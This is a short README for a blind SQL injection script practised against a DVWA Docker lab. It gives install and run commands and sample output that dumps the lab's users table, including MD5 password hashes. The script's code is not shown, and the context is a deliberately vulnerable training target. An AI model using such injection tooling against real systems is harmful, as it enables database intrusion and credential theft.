# Blind SQL injection script

## Requirements

`python 3.9` and `httpx`

Install: `pip install httpx` (or better yet, use venv)


## Lab setup

Start the DVWA docker container by using:

`docker run --rm -it -p 80:80 vulnerables/web-dvwa`


## Run

To run the script just use:
`python sqli.py`


## Example output

```
The table 'users' has 8 columns
The table 'users' has 5 rows
Table 'users' records:
	['user_id', 'first_name', 'last_name', 'user', 'password', 'avatar', 'last_login', 'failed_login']
	['1', 'admin', 'admin', 'admin', '5f4dcc3b5aa765d61d8327deb882cf99', '/hackable/users/admin.jpg', '2021-03-20 02:28:23', '0']
	['2', 'Gordon', 'Brown', 'gordonb', 'e99a18c428cb38d5f260853678922e03', '/hackable/users/gordonb.jpg', '2021-03-20 02:28:23', '0']
	['3', 'Hack', 'Me', '1337', '8d3533d75ae2c3966d7e0d4fcc69216b', '/hackable/users/1337.jpg', '2021-03-20 02:28:23', '0']
	['4', 'Pablo', 'Picasso', 'pablo', '0d107d09f5bbe40cade3de5c71e9e9b7', '/hackable/users/pablo.jpg', '2021-03-20 02:28:23', '0']
	['5', 'Bob', 'Smith', 'smithy', '5f4dcc3b5aa765d61d8327deb882cf99', '/hackable/users/smithy.jpg', '2021-03-20 02:28:23', '0']
```
